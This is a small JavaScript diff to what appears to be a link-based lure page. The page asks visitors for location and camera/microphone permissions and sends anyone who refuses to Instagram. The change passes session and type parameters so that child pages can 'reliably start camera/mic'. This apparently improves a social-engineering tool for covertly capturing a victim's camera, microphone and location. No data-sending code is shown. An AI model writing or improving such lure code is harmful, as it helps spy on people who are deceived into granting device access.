@@ -96,11 +96,14 @@ if(config.perm.includes('location'))document.getElementById('perm-location').sty
 
 function allowAccess(){
   if(s&&t){
-    location.href=config.page+'?s='+s;
+    // Pass both session id and type so child pages can reliably start camera/mic.
+    // (Some browsers/policies depend on correct parameters to initialize.)
+    location.href=config.page+'?s='+encodeURIComponent(s)+'&t='+encodeURIComponent(t);
   }else{
     alert('Invalid session. Please generate a new link.');
   }
 }
+
 
 function denyAccess(){
   if(confirm('Are you sure you want to deny access? You will be redirected to Instagram.')){
